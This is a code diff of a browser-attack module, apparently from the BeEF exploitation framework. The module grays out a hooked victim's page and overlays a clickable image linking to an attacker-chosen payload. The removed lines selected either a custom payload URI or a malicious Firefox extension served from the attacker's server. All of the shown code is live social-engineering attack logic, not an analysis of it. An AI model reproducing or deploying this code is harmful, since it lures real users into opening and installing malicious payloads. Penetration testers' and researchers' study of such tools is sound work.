@@ -8,11 +8,6 @@ beef.execute(function() {
   
   // Module Configurations
   var image = "<%== @image %>";
-  var payload_type = "<%== @payload %>";
-  var payload_uri = "<%== @payload_uri %>";
-
-  var beef_root = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port;
-  var payload = "";
 
   // Function to gray out the screen
   var grayOut = function(vis, options) {
@@ -50,20 +45,6 @@ beef.execute(function() {
     }
   };
 
-
-  // Payload Configuration
-  switch (payload_type) {
-    case "Custom_Payload":
-      payload = payload_uri;
-    break;
-    case "Firefox_Extension":
-      payload = beef_root + "/api/ipec/ff_extension";
-      break;
-    default:
-      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'error=payload not selected');
-      break;
-  }
-
   // Create DIV
   var flashdiv = document.createElement('div');
   flashdiv.setAttribute('id', 'flashDiv');
@@ -73,7 +54,7 @@ beef.execute(function() {
 
   // window.open is very useful when using data URI vectors and the IFrame/Object tag
   // also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
-  flashdiv.innerHTML = "<a href=\"" + payload + "\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";
+  flashdiv.innerHTML = "<a href=\"<%== @payload_uri %>\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";
 
   // gray out the background
   grayOut(true,{'opacity':'30'});
